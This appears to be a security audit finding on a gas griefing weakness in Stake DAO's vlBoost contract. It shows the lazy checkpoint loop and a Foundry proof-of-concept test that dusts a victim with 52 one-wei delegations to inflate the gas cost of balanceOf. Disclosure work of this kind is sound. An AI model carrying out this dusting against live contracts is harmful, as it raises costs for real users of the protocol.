# Stake DAO vlSDT Galaxy Audit - Gas Griefing (SD-01)

## Vulnerability: Gas Griefing via Lazy Checkpoint Loop
**Severity:** Low-Medium
**Target:** `vlBoost.sol`
**Function:** `_checkpointRead`

### Technical Detail
The `vlBoost` contract uses a lazy checkpointing mechanism to compute user balances. When `balanceOf(user)` is called, the contract iterates through a loop to subtract expired delegations from the `delegatedTotal` or `receivedTotal`.

```solidity
uint256 week = (lastTs / WEEK) * WEEK;
for (uint256 i = 0; i < MAX_DURATION_WEEKS + 1; i++) {
    week += WEEK;
    if (week > block.timestamp) break;

    uint256 expiring = isDelegated ? delegatedExpiring[user][week] : receivedExpiring[user][week];
    balance = balance > expiring ? balance - expiring : 0;
}
```

This loop is bounded by `MAX_DURATION_WEEKS + 1` (53 iterations). Each iteration performs a storage read from the `delegatedExpiring` or `receivedExpiring` mapping.

### Impact
An attacker can "dust" a victim's address by creating 52 tiny delegations (e.g., 1 wei of boost), each expiring in a different week across the next year. 

Once these delegations start expiring, every call to `balanceOf(target)`—including internal calls made by other contracts or the user's own transactions—will be forced to execute the full loop.

**Measured Gas Overhead:** ~35,107 gas per call (at 52 weeks).

### Reproduction Recipe (Foundry)
```solidity
function test_vlBoost_Checkpoint_Actual_DOS() public {
    vm.startPrank(attacker);
    for (uint256 i = 1; i <= 52; i++) {
        uint256 endtime = block.timestamp + i * 7 days;
        vboost.boost(attacker, 1, endtime, victim);
    }
    vm.stopPrank();

    vm.warp(block.timestamp + 52 * 7 days);

    uint256 gasBefore = gasleft();
    vboost.balanceOf(victim);
    uint256 gasUsed = gasBefore - gasleft();
    console.log("Gas used for 52-week walk:", gasUsed);
}
```
